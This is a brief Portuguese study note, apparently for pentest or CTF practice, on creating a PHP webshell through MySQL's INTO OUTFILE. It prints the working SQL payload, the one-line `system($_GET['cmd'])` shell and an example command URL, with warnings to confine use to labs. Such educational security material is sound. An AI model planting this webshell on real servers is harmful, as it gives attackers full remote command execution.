---
tags:
  - webshell
  - web
---
---

# Webshell via MySQL - Conceito e Funcionamento

**Comando Exemplo:**
```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/opt/lampp/htdocs/shell.php";
```

**O que faz:**
- Cria um arquivo PHP (`shell.php`) no diretório web (`htdocs`) do XAMPP.
- Escreve no arquivo o código PHP que permite executar comandos do sistema via URL:

```php
<?php system($_GET['cmd']); ?>
```
- Exemplo de uso: `http://localhost/shell.php?cmd=ls`

**Para que serve:**
- Funciona como um **webshell**, permitindo executar comandos do sistema operacional via navegador.
- Usado em **testes de segurança** (laboratórios, CTFs, pentests) para aprender sobre vulnerabilidades.
- **Muito perigoso** em servidores reais, pois dá controle total do sistema.

**Observações:**
- Use **apenas em ambiente local** ou controlado (XAMPP, Docker, máquinas virtuais).
- Em servidores reais, **não deve ser usado**.

**Segurança:**
- Não exponha o arquivo à internet.
- Sempre limpe ou exclua após testes.